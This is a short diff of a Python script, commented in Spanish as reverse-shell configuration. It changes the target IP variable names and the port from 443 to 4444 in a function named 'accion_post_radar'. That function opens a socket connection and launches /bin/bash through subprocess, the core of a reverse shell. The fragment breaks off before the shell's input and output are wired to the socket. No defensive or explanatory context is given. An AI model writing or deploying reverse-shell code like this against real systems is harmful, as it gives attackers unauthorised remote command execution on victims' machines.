@@ -9,13 +9,13 @@ import os
 
 # configuración reverse shell
 TIEMPO_ESPERA = 2
-IP_OBJETIVO = "127.0.0.1"
-PUERTO_OBJETIVO = 443
+IP = "127.0.0.1"
+PUERTO = 4444
 
 def accion_post_radar():
     try:
         s = socket.socket()
-        s.connect((IP_OBJETIVO, PUERTO_OBJETIVO))
+        s.connect((IP, PUERTO))
 
         shell = subprocess.Popen(
             ["/bin/bash"],
